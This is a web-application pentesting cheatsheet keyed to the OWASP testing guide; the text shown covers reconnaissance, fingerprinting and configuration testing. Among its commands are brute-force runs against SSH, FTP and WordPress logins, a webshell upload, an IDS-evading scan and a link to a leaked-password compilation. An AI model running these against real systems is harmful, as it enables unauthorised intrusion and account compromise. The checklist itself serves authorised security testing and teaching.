# Web-app pentesting checklist / cheatsheet

... aligned with OWASP testing guide v 4.2 - https://owasp.org/www-project-web-security-testing-guide/v42/

## Table of Contents

- [4.1 Information Gathering](#41-information-gathering)
  - [4.1.1 Conduct Search Engine Discovery Reconnaissance for Information Leakage (WSTG-INFO-01)](#411-conduct-search-engine-discovery-reconnaissance-for-information-leakage-wstg-info-01)
  - [4.1.2 Fingerprint Web Server (WSTG-INFO-02)](#412-fingerprint-web-server-wstg-info-02)
  - [4.1.3 Review Webserver Metafiles for Information Leakage (WSTG-INFO-03)](#413-review-webserver-metafiles-for-information-leakage-wstg-info-03)
  - [4.1.4 Enumerate Applications on Webserver (WSTG-INFO-07)](#414-enumerate-applications-on-webserver-wstg-info-07)
  - [4.1.5 Review Webpage Content for Information Leakage (WSTG-INFO-05)](#415-review-webpage-content-for-information-leakage-wstg-info-05)
  - [4.1.6 Identify Application Entry Points (WSTG-INFO-06)](#416-identify-application-entry-points-wstg-info-06)
  - [4.1.7 Map Execution Paths Through Application (WSTG-INFO-07)](#417-map-execution-paths-through-application-wstg-info-07)
  - [4.1.8/9 Fingerprint Web Application (WSTG-INFO-08 / WSTG-INFO-09)](#4189-fingerprint-web-application-wstg-info-08--wstg-info-09)
  - [4.1.10 Map Application Architecture (WSTG-INFO-10)](#4110-map-application-architecture-wstg-info-10)
- [4.2 Configuration and Deployment Management Testing](#42-configuration-and-deployment-management-testing)
  - [4.2.1 Test Network Infrastructure Configuration (WSTG-CONF-01)](#421-test-network-infrastructure-configuration-wstg-conf-01)
  - [4.2.2 Test Application Platform Configuration (WSTG-CONF-02)](#422-test-application-platform-configuration-wstg-conf-02)
  - [4.2.3 Test File Extensions Handling for Sensitive Information (WSTG-CONF-03)](#423-test-file-extensions-handling-for-sensitive-information-wstg-conf-03)
  - [4.2.4 Review Old Backup and Unreferenced Files for Sensitive Information (WSTG-CONF-04)](#424-review-old-backup-and-unreferenced-files-for-sensitive-information-wstg-conf-04)
  - [4.2.5 Enumerate Infrastructure and Application Admin Interfaces (WSTG-CONF-05)](#425-enumerate-infrastructure-and-application-admin-interfaces-wstg-conf-05)
  - [4.2.6 Test HTTP Methods (WSTG-CONF-06)](#426-test-http-methods-wstg-conf-06)
  - [4.2.7 Test HTTP Strict Transport Security (WSTG-CONF-07)](#427-test-http-strict-transport-security-wstg-conf-07)
  - [4.2.8 Test RIA Cross Domain Policy (WSTG-CONF-08)](#428-test-ria-cross-domain-policy-wstg-conf-08)
  - [4.2.9 Test File Permission (WSTG-CONF-09)](#429-test-file-permission-wstg-conf-09)
  - [4.2.10 Test for Subdomain Takeover (WSTG-CONF-10)](#4210-test-for-subdomain-takeover-wstg-conf-10)
  - [4.2.11 Test Cloud Storage (WSTG-CONF-11)](#4211-test-cloud-storage-wstg-conf-11)
- [4.3 Identity Management Testing](#43-identity-management-testing)
  - [4.3.1 Test Role Definitions (WSTG-IDNT-01)](#431-test-role-definitions-wstg-idnt-01)
  - [4.3.2 Test User Registration Process (WSTG-IDNT-02)](#432-test-user-registration-process-wstg-idnt-02)
  - [4.3.3 Test Account Provisioning Process (WSTG-IDNT-03)](#433-test-account-provisioning-process-wstg-idnt-03)
  - [4.3.4 Testing for Account Enumeration and Guessable User Account (WSTG-IDNT-04)](#434-testing-for-account-enumeration-and-guessable-user-account-wstg-idnt-04)
  - [4.3.5 Testing for Weak or Unenforced Username Policy (WSTG-IDNT-05)](#435-testing-for-weak-or-unenforced-username-policy-wstg-idnt-05)
- [4.4 Authentication Testing](#44-authentication-testing)
  - [4.4.1 Testing for Credentials Transported over an Encrypted Channel (WSTG-ATHN-01)](#441-testing-for-credentials-transported-over-an-encrypted-channel-wstg-athn-01)
  - [4.4.2 Testing for Default Credentials (WSTG-ATHN-02)](#442-testing-for-default-credentials-wstg-athn-02)
  - [4.4.3 Testing for Weak Lock Out Mechanism (WSTG-ATHN-03)](#443-testing-for-weak-lock-out-mechanism-wstg-athn-03)
  - [4.4.4 Testing for Bypassing Authentication Schema (WSTG-ATHN-04)](#444-testing-for-bypassing-authentication-schema-wstg-athn-04)
  - [4.4.5 Testing for Vulnerable Remember Password (WSTG-ATHN-05)](#445-testing-for-vulnerable-remember-password-wstg-athn-05)
  - [4.4.6 Testing for Browser Cache Weaknesses (WSTG-ATHN-06)](#446-testing-for-browser-cache-weaknesses-wstg-athn-06)
  - [4.4.7 Testing for Weak Password Policy (WSTG-ATHN-07)](#447-testing-for-weak-password-policy-wstg-athn-07)
  - [4.4.8 Testing for Weak Security Question Answer (WSTG-ATHN-08)](#448-testing-for-weak-security-question-answer-wstg-athn-08)
  - [4.4.9 Testing for Weak Password Change or Reset Functionalities (WSTG-ATHN-09)](#449-testing-for-weak-password-change-or-reset-functionalities-wstg-athn-09)
  - [4.4.10 Testing for Weaker Authentication in Alternative Channel (WSTG-ATHN-10)](#4410-testing-for-weaker-authentication-in-alternative-channel-wstg-athn-10)
- [4.5 Authorization Testing](#45-authorization-testing)
  - [4.5.1 Testing Directory Traversal File Include (WSTG-ATHZ-01)](#451-testing-directory-traversal-file-include-wstg-athz-01)
  - [4.5.2 Testing for Bypassing Authorization Schema (WSTG-ATHZ-02)](#452-testing-for-bypassing-authorization-schema-wstg-athz-02)
  - [4.5.3 Testing for Privilege Escalation (WSTG-ATHZ-03)](#453-testing-for-privilege-escalation-wstg-athz-03)
  - [4.5.4 Testing for Insecure Direct Object References (WSTG-ATHZ-04)](#454-testing-for-insecure-direct-object-references-wstg-athz-04)
- [4.6 Session Management Testing](#46-session-management-testing)
  - [4.6.1 Testing for Session Management Schema (WSTG-SESS-01)](#461-testing-for-session-management-schema-wstg-sess-01)
  - [4.6.2 Testing for Cookies Attributes (WSTG-SESS-02)](#462-testing-for-cookies-attributes-wstg-sess-02)
  - [4.6.3 Testing for Session Fixation (WSTG-SESS-03)](#463-testing-for-session-fixation-wstg-sess-03)
  - [4.6.4 Testing for Exposed Session Variables (WSTG-SESS-04)](#464-testing-for-exposed-session-variables-wstg-sess-04)
  - [4.6.5 Testing for Cross Site Request Forgery (WSTG-SESS-05)](#465-testing-for-cross-site-request-forgery-wstg-sess-05)
  - [4.6.6 Testing for Logout Functionality (WSTG-SESS-06)](#466-testing-for-logout-functionality-wstg-sess-06)
  - [4.6.7 Testing Session Timeout (WSTG-SESS-07)](#467-testing-session-timeout-wstg-sess-07)
  - [4.6.8 Testing for Session Puzzling (WSTG-SESS-08)](#468-testing-for-session-puzzling-wstg-sess-08)
  - [4.6.9 Testing for Session Hijacking (WSTG-SESS-09)](#469-testing-for-session-hijacking-wstg-sess-09)
- [4.7 Input Validation Testing](#47-input-validation-testing)
  - [4.7.1 Testing for Reflected Cross Site Scripting (WSTG-INPV-01)](#471-testing-for-reflected-cross-site-scripting-wstg-inpv-01)
  - [4.7.2 Testing for Stored Cross Site Scripting (WSTG-INPV-02)](#472-testing-for-stored-cross-site-scripting-wstg-inpv-02)
  - [4.7.3 Testing for HTTP Verb Tampering (WSTG-INPV-03)](#473-testing-for-http-verb-tampering-wstg-inpv-03)
  - [4.7.4 Testing for HTTP Parameter Pollution (WSTG-INPV-04)](#474-testing-for-http-parameter-pollution-wstg-inpv-04)
  - [4.7.5 Testing for SQL Injection (WSTG-INPV-05)](#475-testing-for-sql-injection-wstg-inpv-05)
  - [4.7.6 Testing for LDAP Injection (WSTG-INPV-06)](#476-testing-for-ldap-injection-wstg-inpv-06)
  - [4.7.7 Testing for XML Injection (WSTG-INPV-07)](#477-testing-for-xml-injection-wstg-inpv-07)
  - [4.7.8 Testing for SSI Injection (WSTG-INPV-08)](#478-testing-for-ssi-injection-wstg-inpv-08)
  - [4.7.9 Testing for XPath Injection (WSTG-INPV-09)](#479-testing-for-xpath-injection-wstg-inpv-09)
  - [4.7.10 Testing for IMAP SMTP Injection (WSTG-INPV-10)](#4710-testing-for-imap-smtp-injection-wstg-inpv-10)
  - [4.7.11 Testing for Code Injection (WSTG-INPV-11)](#4711-testing-for-code-injection-wstg-inpv-11)
  - [4.7.12 Testing for Command Injection (WSTG-INPV-12)](#4712-testing-for-command-injection-wstg-inpv-12)
  - [4.7.13 Testing for Format String Injection (WSTG-INPV-13)](#4713-testing-for-format-string-injection-wstg-inpv-13)
  - [4.7.14 Testing for Incubated Vulnerability (WSTG-INPV-14)](#4714-testing-for-incubated-vulnerability-wstg-inpv-14)
  - [4.7.15 Testing for HTTP Splitting Smuggling (WSTG-INPV-15)](#4715-testing-for-http-splitting-smuggling-wstg-inpv-15)
  - [4.7.16 Testing for HTTP Incoming Requests (WSTG-INPV-16)](#4716-testing-for-http-incoming-requests-wstg-inpv-16)
  - [4.7.17 Testing for Host Header Injection (WSTG-INPV-17)](#4717-testing-for-host-header-injection-wstg-inpv-17)
  - [4.7.18 Testing for Server-side Template Injection (WSTG-INPV-18)](#4718-testing-for-server-side-template-injection-wstg-inpv-18)
  - [4.7.19 Testing for Server-Side Request Forgery (WSTG-INPV-19)](#4719-testing-for-server-side-request-forgery-wstg-inpv-19)
- [4.8 Testing for Error Handling](#48-testing-for-error-handling)
  - [4.8.1 Testing for Improper Error Handling (WSTG-ERRH-01)](#481-testing-for-improper-error-handling-wstg-errh-01)
  - [4.8.2 Testing for Stack Traces (WSTG-ERRH-02)](#482-testing-for-stack-traces-wstg-errh-02)
- [4.9 Testing for Weak Cryptography](#49-testing-for-weak-cryptography)
  - [4.9.1 Testing for Weak Transport Layer Security (WSTG-CRYP-01)](#491-testing-for-weak-transport-layer-security-wstg-cryp-01)
  - [4.9.2 Testing for Padding Oracle (WSTG-CRYP-02)](#492-testing-for-padding-oracle-wstg-cryp-02)
  - [4.9.3 Testing for Sensitive Information Sent via Unencrypted Channels (WSTG-CRYP-03)](#493-testing-for-sensitive-information-sent-via-unencrypted-channels-wstg-cryp-03)
  - [4.9.4 Testing for Weak Encryption (WSTG-CRYP-04)](#494-testing-for-weak-encryption-wstg-cryp-04)
- [4.10 Business Logic Testing](#410-business-logic-testing)
  - [4.10.1 Test Business Logic Data Validation (WSTG-BUSL-01)](#4101-test-business-logic-data-validation-wstg-busl-01)
  - [4.10.2 Test Ability to Forge Requests (WSTG-BUSL-02)](#4102-test-ability-to-forge-requests-wstg-busl-02)
  - [4.10.3 Test Integrity Checks (WSTG-BUSL-03)](#4103-test-integrity-checks-wstg-busl-03)
  - [4.10.4 Test for Process Timing (WSTG-BUSL-04)](#4104-test-for-process-timing-wstg-busl-04)
  - [4.10.5 Test Number of Times a Function Can Be Used Limits (WSTG-BUSL-05)](#4105-test-number-of-times-a-function-can-be-used-limits-wstg-busl-05)
  - [4.10.6 Testing for the Circumvention of Work Flows (WSTG-BUSL-06)](#4106-testing-for-the-circumvention-of-work-flows-wstg-busl-06)
  - [4.10.7 Test Defenses Against Application Misuse (WSTG-BUSL-07)](#4107-test-defenses-against-application-misuse-wstg-busl-07)
  - [4.10.8 Test Upload of Unexpected File Types (WSTG-BUSL-08)](#4108-test-upload-of-unexpected-file-types-wstg-busl-08)
  - [4.10.9 Test Upload of Malicious Files (WSTG-BUSL-09)](#4109-test-upload-of-malicious-files-wstg-busl-09)
- [4.11 Client-side Testing](#411-client-side-testing)
  - [4.11.1 Testing for DOM-Based Cross Site Scripting (WSTG-CLNT-01)](#4111-testing-for-dom-based-cross-site-scripting-wstg-clnt-01)
  - [4.11.2 Testing for JavaScript Execution (WSTG-CLNT-02)](#4112-testing-for-javascript-execution-wstg-clnt-02)
  - [4.11.3 Testing for HTML Injection (WSTG-CLNT-03)](#4113-testing-for-html-injection-wstg-clnt-03)
  - [4.11.4 Testing for Client-side URL Redirect (WSTG-CLNT-04)](#4114-testing-for-client-side-url-redirect-wstg-clnt-04)
  - [4.11.5 Testing for CSS Injection (WSTG-CLNT-04)](#4115-testing-for-css-injection-wstg-clnt-04)
  - [4.11.6 Testing for Client-side Resource Manipulation (WSTG-CLNT-06)](#4116-testing-for-client-side-resource-manipulation-wstg-clnt-06)
  - [4.11.7 Testing Cross Origin Resource Sharing (WSTG-CLNT-07)](#4117-testing-cross-origin-resource-sharing-wstg-clnt-07)
  - [4.11.8 Testing for Cross Site Flashing (WSTG-CLNT-08)](#4118-testing-for-cross-site-flashing-wstg-clnt-08)
  - [4.11.9 Testing for Clickjacking (WSTG-CLNT-09)](#4119-testing-for-clickjacking-wstg-clnt-09)
  - [4.11.10 Testing WebSockets (WSTG-CLNT-10)](#41110-testing-websockets-wstg-clnt-10)
  - [4.11.11 Testing Web Messaging (WSTG-CLNT-11)](#41111-testing-web-messaging-wstg-clnt-11)
  - [4.11.12 Testing Browser Storage (WSTG-CLNT-12)](#41112-testing-browser-storage-wstg-clnt-12)
  - [4.11.13 Testing for Cross Site Script Inclusion (WSTG-CLNT-13)](#41113-testing-for-cross-site-script-inclusion-wstg-clnt-13)
- [4.12 API Testing](#412-api-testing)
  - [4.12.1 Testing GraphQL (WSTG-APIT-01)](#4121-testing-graphql-wstg-apit-01)
- [A. Appendix](#a-apendix)
  - [A.1 Quick & easy servers](#a1-quick--easy-servers)
  - [A.2 Webshells](#a2-webshells)
  - [A.3 Wordpress](#a3-wordpress)
  - [A.4 SOAP Webservice](#a4-soap-webservice)
  - [A.5 Linux privilege escalation](#a4-linux-privilege-escalation)
  - [A.6 Useful links](#a5-useful-links)

---

## 4.1 Information Gathering

### 4.1.1 Conduct Search Engine Discovery Reconnaissance for Information Leakage  (WSTG-INFO-01)

#### Google dorks 

 - `site:pentest-experts.com` - all indexed urls, files of a speciffic site
 - `inurl:admin` - search for admin-panel
 - `intitle:admin` - search for admin-panel
 - `ext:(old | bak | inc)` - file extensions (which could potentially leak information)
 - `site:pentest-experts.com filetype:xml` - filetype work only in comb. with site
 - `site:*.pentest-experts.com` - all subdomains
 - `cache:pentest-experts.com` - display cached version
 - `info:pentest-experts.com` - informatio about the webpage

#### Passiv portsacn results

 - https://shodan.io
 - https://search.censys.io

#### DNS, Domain & IP informations

 - `host pentest-experts.com`
 - `whois pentest-experts.com`
 - `dnsrecon -d pentest-experts.com`
 - https://sitereport.netcraft.com
 - https://dnsdumpster.com


#### Enumerating subdomains / emails via OSINT

 - `sublist3r -d pentest-experts.com`
 - `theHarvester -d pentest-experts.com -b all`
 - https://crt.sh
 - https://osint.sh

#### Older versions of websites

 - https://web.archive.org

#### Leaked passwords

 - https://downloadtorrentfile.com/hash/af2879db0fab2a32ba38d0491aa8fea5e29d3678?name=CompilationOfManyBreaches.7z
 - Searches in google and the darknet search engines:  
   - https://haveibeenpwned.com  
   - https://infostealers.info

[Table of Contents](#table-of-contents)

---

### 4.1.2 Fingerprint Web Server (WSTG-INFO-02)

#### NMAP full scan 

 - `nmap -Pn -sV -O -p- --script all 1.2.3.4`  
 - `nmap -Pn -sV -O -sC -T0 -p- 1.2.3.4`  
   Execute also the default scripts (`-sC`) and run a very slow scan to avoid IDS/IPS detection (`-T0`)

#### Manual testing

 - `curl -i "https://pentest-experts.com/"`
 - `curl -i "https://pentest-experts.com/nonexistent.file"`
 - `curl -i -X OPTIONS "https://pentest-experts.com/"`


### 4.1.3 Review Webserver Metafiles for Information Leakage (WSTG-INFO-03)

#### Interesting files on a website

 - `robots.txt` - files & folders which sould not be indexed
 - `humans.txt` - an initiative for knowing the people behind a website
 - `securitys.txt` - define security policies and contact details
 - `sitemap.xml` - list of all URLs which sould be indexed
 - `urllist.txt` - list of all URLs which sould be indexed

#### Review the meta-tags in the webpage

 - `curl --no-progress-meter -L "https://pentest-experts.com/" | grep "meta"`

#### The `.well-known` URIs

The `.well-known` standard, serves as a standardized directory within a website's root domain with a treasure-trove of information - see: https://www.iana.org/assignments/well-known-uris/well-known-uris.xhtml 

e.g.:

 - `https://pentest-experts.com/.well-known/openid-configuration`  
   JSON document containing metadata about OpenID endpoints, supported authentication methods, token issuance, etc.

**Wordlist**

```
acme-challenge
ai-plugin.json
apple-app-site-association
apple-developer-merchantid-domain-association
appspecific
ashrae
assetlinks.json
atproto-did
autoconfig/mail
browserid
caldav
carddav
change-password
coap
com.apple.remotemanagement
com.chrome.devtools.json
core
csvm
dat
did.json
discord
dnt
dnt-policy.txt
est
genid
gpc.json
hoba
host-meta
host-meta.json
http-opportunistic
keybase.txt
matrix
mercure
mta-sts.txt
ni
nodeinfo
nostr.json
oauth-authorization-server
openid-configuration
openorg
openpgpkey
org.flathub.VerifiedApps.txt
passkey-endpoints
pki-validation
posh
privacy-sandbox-attestations.json
pubvendors.json
reload-config
repute-template
resourcesync
security.txt
statements.txt
stun-key
tdmrep.json
time
timezone
uma2-configuration
vercel/flags
void
webauthn
webfinger
xrp-ledger.toml
```

### 4.1.4 Enumerate Applications on Webserver (WSTG-INFO-07)

#### Check all open ports

 - [nmap](#nmap-full-scan)

#### DNS reconissance

 - `dnsenum --enum pentest-experts.com`  
   (enumeration using zone transfer and public sources)
 - `dnsenum --enum inlanefreight.com -f /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -r`  
   (recursive enumeration using a wordlist)
 - `dig axfr @nsztm1.digi.ninja zonetransfer.me`   
 Zonetransfer from `nsztm1.digi.ninja` for `zonetransfer.me`
 - `fierce --domain pentest-experts.com`

#### Subdomain / VHosts brutforcing

 - `gobuster vhost -u https://pentest-experts.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain`  
   (use `-k` to ignore invalid SSL certificates or `-o scan.log` to output to a file)
 - `ffuf -u "https://FUZZ.pentest-experts.com" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -v`  
   Need to resolve the IP via DNS, use e.g. `-mc 200,301,302` to filter for speciffic HTTP response code
 - `ffuf -u "https://pentest-experts.com" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -H 'Host: FUZZ.pentest-experts.com' -v`  
   Need only to resolve the main domain (`pentest-experts.com`) and fuzz for vhosts added to the Webserver configuartion but not added as a A / AAAA record to the DNS. This is done via the `Host` header. Use `-fs 123` to filter speciffic response sizes out in case the response code would not help.

### 4.1.5 Review Webpage Content for Information Leakage (WSTG-INFO-05)

 - Check HTML sourcecode for comments or useful informations like API keys, etc. 
   ```bash
    curl --no-progress-meter -L "https://pentest-experts.com/" | grep -i "api"
    curl --no-progress-meter -L "https://pentest-experts.com/" | grep -i "key"
    curl --no-progress-meter -L "https://pentest-experts.com/" | grep -i "access"
    curl --no-progress-meter -L "https://pentest-experts.com/" | grep -i "path"
    curl --no-progress-meter -L "https://pentest-experts.com/" | grep -i "<\!--"
   ```
 - Check JS files for sensitive informations like API keys  
   ```bash
    curl --no-progress-meter -L "https://pentest-experts.com/js/main.js" | grep -i "api"
    curl --no-progress-meter -L "https://pentest-experts.com/js/main.js" | grep -i "key"
    curl --no-progress-meter -L "https://pentest-experts.com/js/main.js" | grep -i "access"
    curl --no-progress-meter -L "https://pentest-experts.com/js/main.js" | grep -i "credentials"
   ```
 - Do also a manual investigation and do not rely only on filtering with grep!
 - Search for .map files (files mapping compresses files back to the original source code structure, revealing paths, etc.)! If you find `https://pentest-experts.com/js/main.js`, check if `https://pentest-experts.com/js/main.js.map` exists. 

### 4.1.6 Identify Application Entry Points (WSTG-INFO-06)

 - Use ZAP- or BurpSuite Proxy while browsing the site and testing all functions. Those tools will record all requests and therir parameters for later testing.

#### Identifying parameters and endpoints in sourcecode

`HTTrack` can be used to download HTML- and JS code from a website for such analysis.

 - `java -jar attack-surface-detector-cli-1.3.5.jar /path/to/sourcecode/`  
   https://github.com/secdec/attack-surface-detector-cli/releases
 - Create a local repository and use `Snyk`-Extension in VSCode to analyze JavaScript code for vulnerabilities.

### 4.1.7 Map Execution Paths Through Application (WSTG-INFO-07)

 - Use automated Spider in Use ZAP- or BurpSuite Proxy to fill in gaps after manual testing.

### 4.1.8/9 Fingerprint Web Application (WSTG-INFO-08 / WSTG-INFO-09)

 - `buildwith` - Browser plugin
 - `wappalyzer` - Browser plugin
 - `whatweb pentest-experts.com`

#### CMS enumeration / bruteforce-attack

 - `wpscan --url https://pentest-experts.com/wp/`
 - `wpscan --url https://pentest-experts.com/wp/ --enumerate u`  
   (enumerate users)
 - `wpscan --url https://pentest-experts.com/wp/ --enumerate vp --api-token YOUR_TOKEN`  
   (Vuln. plugins, need an API topen for wpscan)
 - `wpscan --url https://pentest-experts.com/wp/ --enumerate vt --api-token YOUR_TOKEN`  
   (Vuln. themes, need an API topen for wpscan)
 - `wpscan --url https://pentest-experts.com/wp/ -U admin -P /usr/share/wordlists/rockyou.txt`  
   (Bruteforce of password)
 - `cmsmap.py https://pentest-experts.com/wp/ -f W`  
   (`W` for WordPress, `J` for Joomla, `D` for Drupal)
 - `joomscan --url "https://pentest-experts.com" -r -ec`  
   (Sacn with "enumerate-components")

```bash
URL="https://pentest-experts.com/"
curl --no-progress-meter -L $URL | grep "WordPress" && echo "---"
curl --no-progress-meter -L $URL | grep "phpbb" && echo "---"
curl --no-progress-meter -L $URL | grep "MediaWiki" && echo "---"
curl --no-progress-meter -L $URL | grep "Joomla" && echo "---"
curl --no-progress-meter -L $URL | grep "Drupal" && echo "---"
curl --no-progress-meter -L $URL | grep "DNN Platform" && echo "---"
```

### 4.1.10 Map Application Architecture (WSTG-INFO-10)

Ask yourseflf:

 - Is there a stateful ispection firewall or just an access list on a router?  
   - Test if nmap `-sS` and `-sA` scan yield different results  
   - It is a strong indicator of a stateful firewall actively dropping unexpected ACK packets if `-sA` results in "filtered" or no responses for ports that `-sS` shows as open  
   - If the results show the opposite - it indicates a stateless filter list, just acting on initial SYN packets.

 - Is there a full-fleged WAF or reverse proxy in place?  
   - `wafw00f -a pentest-experts.com` - find all possible WAFs  
   - Check also headers of the responses for indicators or version numbers of used proxies.

 - Is the app comprised of multiple servers (DB-server, Web-server, etc.) or running on a single machine?
    - Need certain level of access to test. Conduct after initial foothold or in a later stage...

 - Is the app hosted on-prem or in the cloud?  
   - Resolve IP addresses and check with `whois` to who those IPs belong.  
   - Check HTTP headers for indicators  
   - Check DNS records for TXT, NS, CNAME, etc. records if they may indicate usage of cloud.  

 - etc.

### Working with services

FTP

 - `ftp 1.2.3.4`
 - **ftp>** `ls`
 - **ftp>** `cd secret`
 - **ftp>** `get flag.txt`
 - **ftp>** `put linsploit.sh`
 - **ftp>** `bye`
 - `nmap 1.2.3.4 -p 21 --script ftp-brute --script-args userdb=/home/mark/users.txt`
 - `nmap 1.2.3.4 -p 21 --script ftp-anon`
 - `hydra -L users.txt -P rockyou.txt 1.2.3.4 ftp`
 - `hydra -l www-data -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 1.2.3.4 ftp`  
   Bruteforce a 6-8 character password using the characters a-z, A-Z and 0-9

SSH

 - `ssh root@1.2.3.4`
 - `nc 1.2.3.4 22` (Get banner)
 - `nmap 1.2.3.4 -p 22 --script ssh2-enum-algos`
 - `nmap 1.2.3.4 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full`
 - `nmap 1.2.3.4 -p 22 --script ssh-auth-methods --script-args "ssh.user=test"`
 - `hydra -L users.txt -P rockyou.txt 1.2.3.4 ssh`
 - `nmap 1.2.3.4 -p 22 --script ftp-brute --script-args userdb=/home/mark/users.txt`

HTTP

 - `curl -v 1.2.3.4`
 - `curl -i -X OPTIONS 1.2.3.4`
 - `curl https://pentest-experts.com/upload/ --upload-file webshell.php`
 - `httpx https://pentest-experts.com`
 - `httpx --no-verify https://pentest-experts.com`
 - `dirb https://pentest-experts.com`
 - `links https://pentest-experts.com`
 - `lynx https://pentest-experts.com`
 - `nmap -p 443 1.2.3.4 --script ssl-enum-ciphers`
 - `nmap -p 443 1.2.3.4 --script ssl-heartbleed`
 - `nmap -p 80 1.2.3.4 --script http-enum`
 - `nmap -p 80 1.2.3.4 --script http-headers`
 - `nmap -p 80 1.2.3.4 --script http-methods`
 - `nmap -p 80 1.2.3.4 --script http-methods --script-args "http-methods.url=/webdav/"`
 - **msf5>** `use auxiliary/scanner/http/http_version`
 - **msf5>** `use auxiliary/scanner/http/brute_dirs`


### Automate passive and active reconissance

 - `amass enum -d pentest-experts.com -passive -src -ip -dir ./outputfolder/`
 - `amass intel -whois -d pentest-experts.com -active -src -ip -dir ./outputfolder/`
 - `wap.py https://pentest-experts.com common.txt dns.txt`  
 see: https://github.com/mark-b1980/WebsiteAutoRecon

### Bruteforce attacks on SSH and FTP

 - `medusa -h 1.2.3.4 -u admin -p pass1234 -M ssh -n 2222`
 - `medusa -H host_list.txt -U /usr/share/wordlists/common_users.txt -P /usr/share/wordlists/rockyou.txt -M ftp`

[Table of Contents](#table-of-contents)

---

## 4.2 Configuration and Deployment Management Testing

### 4.2.1 Test Network Infrastructure Configuration (WSTG-CONF-01)

 - Checking for known vulnerabilities  
   - Searching for CVEs, etc. for the known versions of used webservers

 - Checking for know administrative tools like Confixx, Cpanel, etc.  
   - Checking for exposed ports of Cpanel, Confixx, MySQL, etc. with [nmap](#nmap-full-scan)  

 - `nikto -h https://pentest-experts.com -o report.html -Format htm`

### 4.2.2 Test Application Platform Configuration (WSTG-CONF-02)

  - `gobuster dir -u https://pentest-experts.com/ -w /usr/share/dirb/wordlists/common.txt -x tar.gz,aspx,old,log,jsa,php6,py,php2,zip,yaml,cnf,bz2,tar.bz2,sql,html,conf,php4,bat,shtml,cfm,php5,phps,hta,pht,ini,reg,tar,inc,pcap,nsf,css,asp,yml,json,htm,jsp,phar,txt,sh,cgi,xml,exe,bak,c,config,mdb,jhtml,php,dll,pl,com,php3,swf,tgz,php7,phtml,gz,js,asa,java,key,pem,crt,cer,sqlite,db,mdf,ldf,dockercfg,md,ps1,jar,war,ear,env -k -b 404,401`  
 Search for directries (`dir`) and files (`-x ...`) with the wordlist (`-w ...`) by accepting also self-signed SSL certificates(`-k`) and blacklisting 404 and 401 errorcodes (`-b ...`) as invalid URLs.
 - `ffuf -w /usr/share/dirb/wordlists/common.txt:FUZZ -u https://pentest-experts.com/FUZZ -recursion -recursion-depth 1 -e .tar.gz,.aspx,.old,.log,.jsa,.php6,.py,.php2,.zip,.yaml,.cnf,.bz2,.tar.bz2,.sql,.html,.conf,.php4,.bat,.shtml,.cfm,.php5,.phps,.hta,.pht,.ini,.reg,.tar,.inc,.pcap,.nsf,.css,.asp,.yml,.json,.htm,.jsp,.phar,.txt,.sh,.cgi,.xml,.exe,.bak,.c,.config,.mdb,.jhtml,.php,.dll,.pl,.com,.php3,.swf,.tgz,.php7,.phtml,.gz,.js,.asa,.java,.key,.pem,.crt,.cer,.sqlite,.db,.mdf,.ldf,.dockercfg,.md,.ps1,.jar,.war,.ear,.env -v`  
   Recursive fuzzing of directory and filename with different extensions.

#### Webserver vulerability scanning

 - `nuclai -u https://pentest-experts.com`  
   https://github.com/projectdiscovery/nuclei
 - `nikto -h https://pentest-experts.com -o report.html -Format htm`

### 4.2.3 Test File Extensions Handling for Sensitive Information (WSTG-CONF-03)

 - see: [Test Application Platform Configuration](#422-test-application-platform-configuration-wstg-conf-02)

### 4.2.4 Review Old Backup and Unreferenced Files for Sensitive Information (WSTG-CONF-04)

 - see: [Test Application Platform Configuration](#422-test-application-platform-configuration-wstg-conf-02)

### 4.2.5 Enumerate Infrastructure and Application Admin Interfaces (WSTG-CONF-05)

 - see: [Test Application Platform Configuration](#422-test-application-platform-configuration-wstg-conf-02)

### 4.2.6 Test HTTP Methods (WSTG-CONF-06)

 - `nmap -p 443 --script http-methods --script-args http-methods.url-path='/index.php' pentest-experts.com`

#### Testing for `PUT` and `TRACE` method

 - `curl -vX PUT https://pentest-experts.com/test.html`
 - `curl -X TRACE https://pentest-experts.com`

#### Testing for access controll bypass with method tampering

 - Check if a URL requireing an login (e.g. redirecting to a login form) when using the `GET` method delivers the data without logging in when using `POST` or a made-up method such as `LETMEIN`:  
   - `curl -X GET https://pentest-experts.com/only-for-logged-in-users/`
   - `curl -X POST https://pentest-experts.com/only-for-logged-in-users/`
   - `curl -X LETMEIN https://pentest-experts.com/only-for-logged-in-users/`

#### HTTP method overriding with X-HTTP-Method header

```bash
curl -X DELETE http://www.pentest-experts.com/resource.html

HTTP/1.1 405 Method Not Allowed
Date: Sat, 04 Apr 2020 18:26:53 GMT
Server: Apache
Allow: GET,HEAD,POST,OPTIONS
Content-Length: 320
Content-Type: text/html; charset=iso-8859-1
Vary: Accept-Encoding
```

... adding the header:

```bash
curl -X DELETE http://www.pentest-experts.com/resource.html -H "X-HTTP-Method: DELETE"

HTTP/1.1 200 OK
Date: Sat, 04 Apr 2020 19:26:01 GMT
Server: Apache
```

### 4.2.7 Test HTTP Strict Transport Security (WSTG-CONF-07)

 - `curl -s -i https://pentest-experts.com | grep -i strict`
 - BurpSuite Proxy
 - OWASP ZAP Proxy
 - [Vulnerability scanners](#webserver-vulerability-scanning)

### 4.2.8 Test RIA Cross Domain Policy (WSTG-CONF-08)

A cross-domain policy file specifies the permissions that a web client such as Java, Adobe Flash, Adobe Reader, etc. use to access data across different domains.

**Filenames (master files stored in domain root)**

 - Crossdomain.xml 
 - Clientaccesspolicy.xml

**Overpermissive example**

```xml
<?xml version="1.0"?>
<!DOCTYPE cross-domain-policy SYSTEM
"http://www.adobe.com/xml/dtds/cross-domain-policy.dtd">
<cross-domain-policy>
    <site-control permitted-cross-domain-policies="all"/>
    <allow-access-from domain="*" secure="false"/>
    <allow-http-request-headers-from domain="*" headers="*" secure="false"/>
</cross-domain-policy>
```

... found policy files should be examined based on least priv. principle.

### 4.2.9 Test File Permission (WSTG-CONF-09)

 - `namei -l /var/www/html/`  
   Only doable with CLI access to server

### 4.2.10 Test for Subdomain Takeover (WSTG-CONF-10)

 - Enumerate all privious and currently used domains / subdomains.
